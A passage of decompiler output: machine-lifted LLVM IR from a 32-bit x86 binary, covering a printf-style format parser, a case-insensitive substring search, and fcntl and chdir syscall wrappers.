  br i1 %v1_804abf1, label %dec_label_pc_804ad02, label %dec_label_pc_804abf7

dec_label_pc_804abf7:                             ; preds = %dec_label_pc_804abef
  %v1_804abf7 = add i32 %v0_804abf7, 1
  store i32 %v1_804abf7, i32* @ebx, align 4
  %v1_804abf8 = inttoptr i32 %v1_804abf7 to i8*
  %v2_804abf8 = load i8, i8* %v1_804abf8, align 1
  %v5_804abf8 = and i32 %v4_804abf8, -256
  %v4_804abfa = icmp eq i8 %v2_804abf8, 0
  br i1 %v4_804abfa, label %dec_label_pc_804ad1a, label %dec_label_pc_804ac02

dec_label_pc_804ac02:                             ; preds = %dec_label_pc_804abf7
  %v10_804ac02 = icmp eq i8 %v2_804abf8, 37
  br i1 %v10_804ac02, label %dec_label_pc_804ad02, label %dec_label_pc_804ac0a

dec_label_pc_804ac0a:                             ; preds = %dec_label_pc_804ac02
  store i32 0, i32* @esi, align 4
  %v10_804ac0c = icmp eq i8 %v2_804abf8, 45
  %v1_804ac0e = icmp eq i1 %v10_804ac0c, false
  br i1 %v1_804ac0e, label %dec_label_pc_804ac1b.preheader, label %dec_label_pc_804ac10

dec_label_pc_804ac10:                             ; preds = %dec_label_pc_804ac0a
  %v1_804ac10 = add i32 %v0_804abf7, 2
  store i32 %v1_804ac10, i32* @ebx, align 4
  store i32 1, i32* @esi, align 4
  br label %dec_label_pc_804ac1b.preheader

dec_label_pc_804ac1b.preheader:                   ; preds = %dec_label_pc_804ac10, %dec_label_pc_804ac0a
  %v0_804ac1b15 = phi i32 [ %v1_804ac10, %dec_label_pc_804ac10 ], [ %v1_804abf7, %dec_label_pc_804ac0a ]
  %v0_804ac1840 = phi i32 [ 1, %dec_label_pc_804ac10 ], [ 0, %dec_label_pc_804ac0a ]
  %v1_804ac1b16 = inttoptr i32 %v0_804ac1b15 to i8*
  %v2_804ac1b17 = load i8, i8* %v1_804ac1b16, align 1
  %v8_804ac1b23 = icmp eq i8 %v2_804ac1b17, 48
  br i1 %v8_804ac1b23, label %dec_label_pc_804ac17, label %dec_label_pc_804ac20

dec_label_pc_804ac17:                             ; preds = %dec_label_pc_804ac1b.preheader, %dec_label_pc_804ac17
  %v0_804ac18 = phi i32 [ %v1_804ac18, %dec_label_pc_804ac17 ], [ %v0_804ac1840, %dec_label_pc_804ac1b.preheader ]
  %v0_804ac17 = phi i32 [ %v1_804ac17, %dec_label_pc_804ac17 ], [ %v0_804ac1b15, %dec_label_pc_804ac1b.preheader ]
  %v1_804ac17 = add i32 %v0_804ac17, 1
  store i32 %v1_804ac17, i32* @ebx, align 4
  %v1_804ac18 = or i32 %v0_804ac18, 2
  store i32 %v1_804ac18, i32* @esi, align 4
  %v1_804ac1b = inttoptr i32 %v1_804ac17 to i8*
  %v2_804ac1b = load i8, i8* %v1_804ac1b, align 1
  %v8_804ac1b = icmp eq i8 %v2_804ac1b, 48
  br i1 %v8_804ac1b, label %dec_label_pc_804ac17, label %dec_label_pc_804ac20

dec_label_pc_804ac20:                             ; preds = %dec_label_pc_804ac17, %dec_label_pc_804ac1b.preheader
  %v0_804acf3 = phi i32 [ %v0_804ac1840, %dec_label_pc_804ac1b.preheader ], [ %v1_804ac18, %dec_label_pc_804ac17 ]
  %v0_804ac2f43 = phi i32 [ %v0_804ac1b15, %dec_label_pc_804ac1b.preheader ], [ %v1_804ac17, %dec_label_pc_804ac17 ]
  %v4_804ac2f.pre = load i32, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v1_804ac2f64 = inttoptr i32 %v0_804ac2f43 to i8*
  %v2_804ac2f65 = load i8, i8* %v1_804ac2f64, align 1
  %v3_804ac2f66 = zext i8 %v2_804ac2f65 to i32
  %v5_804ac2f67 = and i32 %v4_804ac2f.pre, -256
  %v6_804ac2f68 = or i32 %v3_804ac2f66, %v5_804ac2f67
  store i32 %v6_804ac2f68, i32* @ecx, align 4
  %v2_804ac3369 = add i8 %v2_804ac2f65, -48
  %v12_804ac3370 = zext i8 %v2_804ac3369 to i32
  %v15_804ac3372 = or i32 %v12_804ac3370, %v5_804abf8
  %tmp82 = icmp ult i8 %v2_804ac3369, 10
  br i1 %tmp82, label %dec_label_pc_804ac24, label %dec_label_pc_804ac39

dec_label_pc_804ac24:                             ; preds = %dec_label_pc_804ac20, %dec_label_pc_804ac24
  %v6_804ac2f77 = phi i32 [ %v6_804ac2f, %dec_label_pc_804ac24 ], [ %v6_804ac2f68, %dec_label_pc_804ac20 ]
  %v3_804ac2f76 = phi i32 [ %v3_804ac2f, %dec_label_pc_804ac24 ], [ %v3_804ac2f66, %dec_label_pc_804ac20 ]
  %v1_804ac2475 = phi i32 [ %v3_804ac2b, %dec_label_pc_804ac24 ], [ 0, %dec_label_pc_804ac20 ]
  %v0_804ac2a74 = phi i32 [ %v1_804ac2a, %dec_label_pc_804ac24 ], [ %v0_804ac2f43, %dec_label_pc_804ac20 ]
  %v3_804ac24 = mul i32 %v1_804ac2475, 10
  %v1_804ac2a = add i32 %v0_804ac2a74, 1
  store i32 %v1_804ac2a, i32* @ebx, align 4
  %v2_804ac2b = add i32 %v3_804ac24, -48
  %v3_804ac2b = add i32 %v2_804ac2b, %v3_804ac2f76
  store i32 %v3_804ac2b, i32* @edi, align 4
  %v1_804ac2f = inttoptr i32 %v1_804ac2a to i8*
  %v2_804ac2f = load i8, i8* %v1_804ac2f, align 1
  %v3_804ac2f = zext i8 %v2_804ac2f to i32
  %v5_804ac2f = and i32 %v6_804ac2f77, -256
  %v6_804ac2f = or i32 %v3_804ac2f, %v5_804ac2f
  store i32 %v6_804ac2f, i32* @ecx, align 4
  %v2_804ac33 = add i8 %v2_804ac2f, -48
  %v12_804ac33 = zext i8 %v2_804ac33 to i32
  %tmp83 = icmp ult i8 %v2_804ac33, 10
  br i1 %tmp83, label %dec_label_pc_804ac24, label %dec_label_pc_804ac39

dec_label_pc_804ac39:                             ; preds = %dec_label_pc_804ac24, %dec_label_pc_804ac20
  %v1_804ac24.lcssa = phi i32 [ 0, %dec_label_pc_804ac20 ], [ %v3_804ac2b, %dec_label_pc_804ac24 ]
  %v2_804ac2f.lcssa = phi i8 [ %v2_804ac2f65, %dec_label_pc_804ac20 ], [ %v2_804ac2f, %dec_label_pc_804ac24 ]
  %v15_804ac33.lcssa = phi i32 [ %v15_804ac3372, %dec_label_pc_804ac20 ], [ %v12_804ac33, %dec_label_pc_804ac24 ]
  %v10_804ac39 = icmp eq i8 %v2_804ac2f.lcssa, 115
  %v1_804ac3c = icmp eq i1 %v10_804ac39, false
  br i1 %v1_804ac3c, label %dec_label_pc_804ac56, label %dec_label_pc_804ac3e

dec_label_pc_804ac3e:                             ; preds = %dec_label_pc_804ac39
  store i32 %v1_804ac24.lcssa, i32* @ecx, align 4
  %v1_804ac4f = inttoptr i32 %stack_var_-36.435 to i32*
  %v2_804ac4f = load i32, i32* %v1_804ac4f, align 4
  br label %dec_label_pc_804acf4

dec_label_pc_804ac56:                             ; preds = %dec_label_pc_804ac39
  %v10_804ac56 = icmp eq i8 %v2_804ac2f.lcssa, 100
  %v1_804ac59 = icmp eq i1 %v10_804ac56, false
  br i1 %v1_804ac59, label %dec_label_pc_804ac86, label %dec_label_pc_804ac6c

dec_label_pc_804ac6c:                             ; preds = %dec_label_pc_804acb7, %dec_label_pc_804ac56
  br label %dec_label_pc_804ac71

dec_label_pc_804ac71:                             ; preds = %dec_label_pc_804acac, %dec_label_pc_804ac6c
  %storemerge84 = phi i32 [ 16, %dec_label_pc_804acac ], [ 10, %dec_label_pc_804ac6c ]
  store i32 %storemerge84, i32* @ecx, align 4
  %v1_804ac71 = inttoptr i32 %stack_var_-36.435 to i32*
  %v2_804ac71 = load i32, i32* %v1_804ac71, align 4
  store i32 %v2_804ac71, i32* @edx, align 4
  store i32 %v0_804abe2, i32* @eax, align 4
  %v0_804ac77 = call i32 @function_804ab01()
  br label %dec_label_pc_804ac7c

dec_label_pc_804ac7c:                             ; preds = %dec_label_pc_804acf4, %dec_label_pc_804ac71
  %storemerge2 = phi i32 [ %v2_804acf8, %dec_label_pc_804acf4 ], [ %v0_804ac77, %dec_label_pc_804ac71 ]
  %stack_var_-36.1 = add i32 %stack_var_-36.435, 4
  %v0_804ac7c = load i32, i32* @ebp, align 4
  %v2_804ac7c = add i32 %v0_804ac7c, %storemerge2
  store i32 %v2_804ac7c, i32* @ebp, align 4
  br label %dec_label_pc_804ad0f

dec_label_pc_804ac86:                             ; preds = %dec_label_pc_804ac56
  %v10_804ac86 = icmp eq i8 %v2_804ac2f.lcssa, 120
  %v1_804ac89 = icmp eq i1 %v10_804ac86, false
  br i1 %v1_804ac89, label %dec_label_pc_804ac9a, label %dec_label_pc_804acac

dec_label_pc_804ac9a:                             ; preds = %dec_label_pc_804ac86
  %v10_804ac9a = icmp eq i8 %v2_804ac2f.lcssa, 88
  %v1_804ac9d = icmp eq i1 %v10_804ac9a, false
  br i1 %v1_804ac9d, label %dec_label_pc_804acb7, label %dec_label_pc_804acac

dec_label_pc_804acac:                             ; preds = %dec_label_pc_804ac9a, %dec_label_pc_804ac86
  br label %dec_label_pc_804ac71

dec_label_pc_804acb7:                             ; preds = %dec_label_pc_804ac9a
  %v10_804acb7 = icmp eq i8 %v2_804ac2f.lcssa, 117
  %v1_804acba = icmp eq i1 %v10_804acb7, false
  br i1 %v1_804acba, label %dec_label_pc_804accf, label %dec_label_pc_804ac6c

dec_label_pc_804accf:                             ; preds = %dec_label_pc_804acb7
  %v10_804accf = icmp eq i8 %v2_804ac2f.lcssa, 99
  %v1_804acd2 = icmp eq i1 %v10_804accf, false
  br i1 %v1_804acd2, label %dec_label_pc_804ad0f, label %dec_label_pc_804acd4

dec_label_pc_804acd4:                             ; preds = %dec_label_pc_804accf
  store i32 %v1_804ac24.lcssa, i32* @ecx, align 4
  %v1_804ace1 = inttoptr i32 %stack_var_-36.435 to i32*
  %v2_804ace1 = load i32, i32* %v1_804ace1, align 4
  store i32 %v2_804ace1, i32* %stack_var_-18, align 4
  br label %dec_label_pc_804acf4

dec_label_pc_804acf4:                             ; preds = %dec_label_pc_804ac3e, %dec_label_pc_804acd4
  %storemerge = phi i32 [ %v2_804ac4f, %dec_label_pc_804ac3e ], [ %v2_804acef, %dec_label_pc_804acd4 ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v0_804abe2, i32* @eax, align 4
  %v1_804acf8 = trunc i32 %v0_804acf3 to i8
  %v2_804acf8 = call i32 @function_804aa77(i8 %v1_804acf8)
  br label %dec_label_pc_804ac7c

dec_label_pc_804ad02:                             ; preds = %dec_label_pc_804ac02, %dec_label_pc_804abef
  %v0_804ad02 = phi i32 [ %v1_804abf7, %dec_label_pc_804ac02 ], [ %v0_804abf7, %dec_label_pc_804abef ]
  %v1_804ad02 = inttoptr i32 %v0_804ad02 to i8*
  %v2_804ad02 = load i8, i8* %v1_804ad02, align 1
  %v3_804ad02 = zext i8 %v2_804ad02 to i32
  store i32 %v3_804ad02, i32* @edx, align 4
  %v0_804ad05 = load i32, i32* @ebp, align 4
  %v1_804ad05 = add i32 %v0_804ad05, 1
  store i32 %v1_804ad05, i32* @ebp, align 4
  store i32 %v0_804abe2, i32* @eax, align 4
  %v0_804ad0a = call i32 @function_804aa48()
  br label %dec_label_pc_804ad0f

dec_label_pc_804ad0f:                             ; preds = %dec_label_pc_804accf, %dec_label_pc_804ac7c, %dec_label_pc_804ad02
  %v4_804ad10 = phi i32 [ %v0_804ad0a, %dec_label_pc_804ad02 ], [ %v15_804ac33.lcssa, %dec_label_pc_804accf ], [ %storemerge2, %dec_label_pc_804ac7c ]
  %stack_var_-36.3 = phi i32 [ %stack_var_-36.435, %dec_label_pc_804ad02 ], [ %stack_var_-36.435, %dec_label_pc_804accf ], [ %stack_var_-36.1, %dec_label_pc_804ac7c ]
  %v0_804ad0f = load i32, i32* @ebx, align 4
  %v1_804ad0f = add i32 %v0_804ad0f, 1
  store i32 %v1_804ad0f, i32* @ebx, align 4
  %v1_804ad10 = inttoptr i32 %v1_804ad0f to i8*
  %v2_804ad10 = load i8, i8* %v1_804ad10, align 1
  %v3_804ad10 = zext i8 %v2_804ad10 to i32
  %v5_804ad10 = and i32 %v4_804ad10, -256
  %v6_804ad10 = or i32 %v3_804ad10, %v5_804ad10
  %v4_804ad12 = icmp eq i8 %v2_804ad10, 0
  %v1_804ad14 = icmp eq i1 %v4_804ad12, false
  br i1 %v1_804ad14, label %dec_label_pc_804abef, label %dec_label_pc_804ad1a

dec_label_pc_804ad1a:                             ; preds = %dec_label_pc_804ad0f, %dec_label_pc_804abf7, %dec_label_pc_804abd7
  %v4_804ad1a = icmp eq i32 %v0_804abe2, 0
  br i1 %v4_804ad1a, label %dec_label_pc_804ad2a, label %dec_label_pc_804ad21

dec_label_pc_804ad21:                             ; preds = %dec_label_pc_804ad1a
  %v1_804ad25 = inttoptr i32 %v0_804abe2 to i32*
  %v2_804ad25 = load i32, i32* %v1_804ad25, align 4
  %v1_804ad27 = inttoptr i32 %v2_804ad25 to i8*
  store i8 0, i8* %v1_804ad27, align 1
  %v2_804ad2f.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804ad2a

dec_label_pc_804ad2a:                             ; preds = %dec_label_pc_804ad1a, %dec_label_pc_804ad21
  %v2_804ad2f = phi i32 [ %v0_804abdc, %dec_label_pc_804ad1a ], [ %v2_804ad2f.pre, %dec_label_pc_804ad21 ]
  %v0_804ad2d = load i32, i32* @ebp, align 4
  store i32 %v2_804ad2f, i32* @ebx, align 4
  store i32 %v0_804abdb, i32* @esi, align 4
  store i32 %v0_804abda, i32* @edi, align 4
  store i32 %v0_804abd7, i32* @ebp, align 4
  ret i32 %v0_804ad2d

; uselistorder directives
  uselistorder i32 %v1_804ad0f, { 1, 2, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i8 %v2_804ac2f.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804ac24.lcssa, { 1, 0 }
  uselistorder i32 %v6_804ac2f, { 1, 0 }
  uselistorder i32 %v3_804ac2f, { 1, 0 }
  uselistorder i32 %v3_804ac2b, { 0, 2, 1 }
  uselistorder i32 %v1_804ac2a, { 1, 2, 0 }
  uselistorder i32 %v1_804ac18, { 0, 2, 1 }
  uselistorder i32 %v1_804ac17, { 0, 2, 3, 1 }
  uselistorder i32 %v0_804ac1840, { 1, 0 }
  uselistorder i32 %v0_804ac1b15, { 1, 0, 2 }
  uselistorder i32 %stack_var_-36.435, { 4, 3, 5, 0, 1, 2 }
  uselistorder i32 %v0_804abf7, { 1, 0, 2 }
  uselistorder i8 %v2_804ad1027, { 1, 0 }
  uselistorder i32 %v0_804abe2, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 ()* @function_804aa48, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8 10, { 1, 0, 2, 3, 4, 6, 7, 5 }
  uselistorder i8 -48, { 1, 0, 2, 3 }
  uselistorder i8 48, { 0, 1, 3, 4, 2 }
  uselistorder i8 45, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804ad2a, { 1, 0 }
  uselistorder label %dec_label_pc_804ad0f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804acf4, { 1, 0 }
  uselistorder label %dec_label_pc_804ac24, { 1, 0 }
  uselistorder label %dec_label_pc_804ac17, { 1, 0 }
  uselistorder label %dec_label_pc_804abef, { 1, 0 }
}

define i32 @function_804ad34(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804ad34:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  store i32 %arg1, i32* @edx, align 4
  %v2_804ad3b = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_804ad3b, i32* @ecx, align 4
  %v2_804ad3f = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804ad3f, i32* @eax, align 4
  %v1_804ad47 = call i32 @function_804abd7(i32 %v2_804ad3b)
  ret i32 %v1_804ad47
}

define i32 @function_804ad50(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804ad50:
  %v3_804ad5d8 = inttoptr i32 %arg3 to i8*
  %v4_804ad5d9 = load i8, i8* %v3_804ad5d8, align 1
  %v5_804ad5d10 = icmp eq i8 %v4_804ad5d9, 0
  %v1_804ad6212 = icmp eq i1 %v5_804ad5d10, false
  br i1 %v1_804ad6212, label %dec_label_pc_804ad58, label %dec_label_pc_804ad64

dec_label_pc_804ad58:                             ; preds = %dec_label_pc_804ad50, %dec_label_pc_804ad58
  %v0_804ad58 = phi i32 [ %v1_804ad58, %dec_label_pc_804ad58 ], [ 0, %dec_label_pc_804ad50 ]
  %v1_804ad58 = add i32 %v0_804ad58, 1
  %v2_804ad5d = add i32 %v1_804ad58, %arg3
  %v3_804ad5d = inttoptr i32 %v2_804ad5d to i8*
  %v4_804ad5d = load i8, i8* %v3_804ad5d, align 1
  %v5_804ad5d = icmp eq i8 %v4_804ad5d, 0
  %v1_804ad62 = icmp eq i1 %v5_804ad5d, false
  br i1 %v1_804ad62, label %dec_label_pc_804ad58, label %dec_label_pc_804ad64

dec_label_pc_804ad64:                             ; preds = %dec_label_pc_804ad58, %dec_label_pc_804ad50
  %v1_804ad9523 = phi i32 [ 0, %dec_label_pc_804ad50 ], [ %v1_804ad58, %dec_label_pc_804ad58 ]
  %v4_804ad6a = ptrtoint i8* %arg1 to i32
  %tmp32 = icmp slt i32 %arg2, 1
  %tmp33 = icmp eq i1 %tmp32, false
  br i1 %tmp33, label %dec_label_pc_804ad70.lr.ph, label %dec_label_pc_804adab

dec_label_pc_804ad70.lr.ph:                       ; preds = %dec_label_pc_804ad64
  %v4_804ad70.pre = load i32, i32* @ecx, align 4
  %v6_804ad77.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ad70

dec_label_pc_804ad70:                             ; preds = %dec_label_pc_804ad70.lr.ph, %dec_label_pc_804ada3
  %v0_804ada3 = phi i32 [ %arg2, %dec_label_pc_804ad70.lr.ph ], [ %v1_804ada3, %dec_label_pc_804ada3 ]
  %v6_804ad77 = phi i32 [ %v6_804ad77.pre, %dec_label_pc_804ad70.lr.ph ], [ %v2_804ad90, %dec_label_pc_804ada3 ]
  %v0_804ad94 = phi i32 [ 0, %dec_label_pc_804ad70.lr.ph ], [ %v1_804ad7717, %dec_label_pc_804ada3 ]
  %v4_804ad70 = phi i32 [ %v4_804ad70.pre, %dec_label_pc_804ad70.lr.ph ], [ %v0_804ad90, %dec_label_pc_804ada3 ]
  %v0_804ad72 = phi i32 [ %v4_804ad6a, %dec_label_pc_804ad70.lr.ph ], [ %v1_804ad72, %dec_label_pc_804ada3 ]
  %v1_804ad70 = inttoptr i32 %v0_804ad72 to i8*
  %v2_804ad70 = load i8, i8* %v1_804ad70, align 1
  %v3_804ad70 = zext i8 %v2_804ad70 to i32
  %v5_804ad70 = and i32 %v4_804ad70, -256
  %v6_804ad70 = or i32 %v3_804ad70, %v5_804ad70
  store i32 %v6_804ad70, i32* @ecx, align 4
  %v1_804ad72 = add i32 %v0_804ad72, 1
  %v2_804ad77 = add i32 %v0_804ad94, %arg3
  %v3_804ad77 = inttoptr i32 %v2_804ad77 to i8*
  %v4_804ad77 = load i8, i8* %v3_804ad77, align 1
  %v5_804ad77 = zext i8 %v4_804ad77 to i32
  %v7_804ad77 = and i32 %v6_804ad77, -256
  %v8_804ad77 = or i32 %v5_804ad77, %v7_804ad77
  store i32 %v8_804ad77, i32* @edx, align 4
  %v2_804ad7c = add i8 %v2_804ad70, -65
  %v8_804ad80 = icmp ugt i8 %v2_804ad7c, 25
  br i1 %v8_804ad80, label %dec_label_pc_804ad85, label %dec_label_pc_804ad82

dec_label_pc_804ad82:                             ; preds = %dec_label_pc_804ad70
  %v2_804ad82 = or i8 %v2_804ad70, 96
  %v7_804ad82 = zext i8 %v2_804ad82 to i32
  %v10_804ad82 = or i32 %v7_804ad82, %v5_804ad70
  store i32 %v10_804ad82, i32* @ecx, align 4
  br label %dec_label_pc_804ad85

dec_label_pc_804ad85:                             ; preds = %dec_label_pc_804ad70, %dec_label_pc_804ad82
  %v0_804ad90 = phi i32 [ %v6_804ad70, %dec_label_pc_804ad70 ], [ %v10_804ad82, %dec_label_pc_804ad82 ]
  %v2_804ad87 = add i8 %v4_804ad77, -65
  %tmp39 = icmp ult i8 %v2_804ad87, 26
  br i1 %tmp39, label %dec_label_pc_804ad8d, label %dec_label_pc_804ad90

dec_label_pc_804ad8d:                             ; preds = %dec_label_pc_804ad85
  %v2_804ad8d = or i8 %v4_804ad77, 96
  %v7_804ad8d = zext i8 %v2_804ad8d to i32
  %v10_804ad8d = or i32 %v7_804ad8d, %v7_804ad77
  br label %dec_label_pc_804ad90

dec_label_pc_804ad90:                             ; preds = %dec_label_pc_804ad85, %dec_label_pc_804ad8d
  %v2_804ad90 = phi i32 [ %v8_804ad77, %dec_label_pc_804ad85 ], [ %v10_804ad8d, %dec_label_pc_804ad8d ]
  %v1_804ad90 = trunc i32 %v0_804ad90 to i8
  %v3_804ad90 = trunc i32 %v2_804ad90 to i8
  %v15_804ad90 = icmp eq i8 %v1_804ad90, %v3_804ad90
  %v1_804ad92 = icmp eq i1 %v15_804ad90, false
  br i1 %v1_804ad92, label %dec_label_pc_804ada1, label %dec_label_pc_804ad94

dec_label_pc_804ad94:                             ; preds = %dec_label_pc_804ad90
  %v1_804ad94 = add i32 %v0_804ad94, 1
  %v12_804ad95 = icmp eq i32 %v1_804ad94, %v1_804ad9523
  %v1_804ad97 = icmp eq i1 %v12_804ad95, false
  br i1 %v1_804ad97, label %dec_label_pc_804ada3, label %dec_label_pc_804ad99

dec_label_pc_804ad99:                             ; preds = %dec_label_pc_804ad94
  %v6_804ad9b = sub i32 %v1_804ad72, %v4_804ad6a
  br label %dec_label_pc_804adab

dec_label_pc_804ada1:                             ; preds = %dec_label_pc_804ad90
  br label %dec_label_pc_804ada3

dec_label_pc_804ada3:                             ; preds = %dec_label_pc_804ad94, %dec_label_pc_804ada1
  %v1_804ad7717 = phi i32 [ %v1_804ad94, %dec_label_pc_804ad94 ], [ 0, %dec_label_pc_804ada1 ]
  %v1_804ada3 = add i32 %v0_804ada3, -1
  %tmp34 = icmp slt i32 %v1_804ada3, 1
  %tmp35 = icmp eq i1 %tmp34, false
  br i1 %tmp35, label %dec_label_pc_804ad70, label %dec_label_pc_804adab

dec_label_pc_804adab:                             ; preds = %dec_label_pc_804ada3, %dec_label_pc_804ad64, %dec_label_pc_804ad99
  %storemerge = phi i32 [ %v6_804ad9b, %dec_label_pc_804ad99 ], [ -1, %dec_label_pc_804ad64 ], [ -1, %dec_label_pc_804ada3 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804ada3, { 1, 0 }
  uselistorder i32 %v1_804ad94, { 1, 0 }
  uselistorder i32 %v0_804ad94, { 1, 0 }
  uselistorder i32 %v4_804ad6a, { 1, 0 }
  uselistorder label %dec_label_pc_804adab, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ada3, { 1, 0 }
  uselistorder label %dec_label_pc_804ad90, { 1, 0 }
  uselistorder label %dec_label_pc_804ad85, { 1, 0 }
  uselistorder label %dec_label_pc_804ad70, { 1, 0 }
  uselistorder label %dec_label_pc_804ad58, { 1, 0 }
}

define i32 @function_804adb0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804adb0:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804adb0 = load i32, i32* @edi, align 4
  %v0_804adb1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804adc9 = add i32 %arg2, -12
  %v6_804adcf = icmp ugt i32 %v1_804adc9, 2
  br i1 %v6_804adcf, label %dec_label_pc_804addf, label %dec_label_pc_804add1

dec_label_pc_804add1:                             ; preds = %dec_label_pc_804adb0
  %v4_804add5 = call i32 @function_804ae07(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804adc9)
  br label %dec_label_pc_804ae01

dec_label_pc_804addf:                             ; preds = %dec_label_pc_804adb0
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804ade7 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804ade7, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_804ade7, -4095
  br i1 %tmp17, label %dec_label_pc_804adff, label %dec_label_pc_804adf3

dec_label_pc_804adf3:                             ; preds = %dec_label_pc_804addf
  %v1_804adf3 = call i32 @function_804b330(i32 %v0_804adb1)
  %v0_804adf8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804adf8 = sub i32 0, %v0_804adf8
  %v2_804adfa = inttoptr i32 %v1_804adf3 to i32*
  store i32 %v1_804adf8, i32* %v2_804adfa, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804adff

dec_label_pc_804adff:                             ; preds = %dec_label_pc_804addf, %dec_label_pc_804adf3
  %v0_804adff = phi i32 [ %v2_804ade7, %dec_label_pc_804addf ], [ -1, %dec_label_pc_804adf3 ]
  br label %dec_label_pc_804ae01

dec_label_pc_804ae01:                             ; preds = %dec_label_pc_804add1, %dec_label_pc_804adff
  %v0_804ae06 = phi i32 [ %v4_804add5, %dec_label_pc_804add1 ], [ %v0_804adff, %dec_label_pc_804adff ]
  store i32 %v0_804adb1, i32* @ebx, align 4
  store i32 %v0_804adb0, i32* @edi, align 4
  ret i32 %v0_804ae06

; uselistorder directives
  uselistorder i32 %v2_804ade7, { 1, 0, 2 }
  uselistorder i32 %v0_804adb1, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804ae01, { 1, 0 }
  uselistorder label %dec_label_pc_804adff, { 1, 0 }
}

define i32 @function_804ae07(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804ae07:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ae07 = load i32, i32* @edi, align 4
  store i32 %v0_804ae07, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804ae1f = load i32, i32* @ebx, align 4
  %v1_804ae27 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804ae27, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_804ae27, -4095
  br i1 %tmp12, label %dec_label_pc_804ae3f, label %dec_label_pc_804ae33

dec_label_pc_804ae33:                             ; preds = %dec_label_pc_804ae07
  %v1_804ae33 = call i32 @function_804b330(i32 %v0_804ae1f)
  %v0_804ae38 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ae38 = sub i32 0, %v0_804ae38
  %v2_804ae3a = inttoptr i32 %v1_804ae33 to i32*
  store i32 %v1_804ae38, i32* %v2_804ae3a, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804ae44.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804ae3f

dec_label_pc_804ae3f:                             ; preds = %dec_label_pc_804ae07, %dec_label_pc_804ae33
  %v2_804ae44 = phi i32 [ %v0_804ae07, %dec_label_pc_804ae07 ], [ %v2_804ae44.pre, %dec_label_pc_804ae33 ]
  %v0_804ae42 = phi i32 [ %v1_804ae27, %dec_label_pc_804ae07 ], [ -1, %dec_label_pc_804ae33 ]
  store i32 %v2_804ae44, i32* %edi.global-to-local, align 4
  ret i32 %v0_804ae42

; uselistorder directives
  uselistorder i32 %v1_804ae27, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ae3f, { 1, 0 }
}

define i32 @function_804ae46(i8* %arg1) local_unnamed_addr {
dec_label_pc_804ae46:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ae46 = load i32, i32* @edi, align 4
  store i32 %v0_804ae46, i32* %stack_var_-4, align 4
  %v4_804ae4a = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ae4a, i32* %edi.global-to-local, align 4
  %v0_804ae4e = load i32, i32* @ebx, align 4
  %v3_804ae56 = call i32 @chdir(i8* %arg1)
  store i32 %v3_804ae56, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_804ae56, -4095
  br i1 %tmp9, label %dec_label_pc_804ae6e, label %dec_label_pc_804ae62

dec_label_pc_804ae62:                             ; preds = %dec_label_pc_804ae46
  %v1_804ae62 = call i32 @function_804b330(i32 %v0_804ae4e)
  %v0_804ae67 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ae67 = sub i32 0, %v0_804ae67
  %v2_804ae69 = inttoptr i32 %v1_804ae62 to i32*
  store i32 %v1_804ae67, i32* %v2_804ae69, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804ae72.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804ae6e

dec_label_pc_804ae6e:                             ; preds = %dec_label_pc_804ae46, %dec_label_pc_804ae62
  %v2_804ae72 = phi i32 [ %v0_804ae46, %dec_label_pc_804ae46 ], [ %v2_804ae72.pre, %dec_label_pc_804ae62 ]
  %v0_804ae6f = phi i32 [ %v3_804ae56, %dec_label_pc_804ae46 ], [ -1, %dec_label_pc_804ae62 ]
  store i32 %v2_804ae72, i32* %edi.global-to-local, align 4
  ret i32 %v0_804ae6f

; uselistorder directives
  uselistorder i32 %v3_804ae56, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ae6e, { 1, 0 }
}

define i32 @function_804ae74(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ae74:
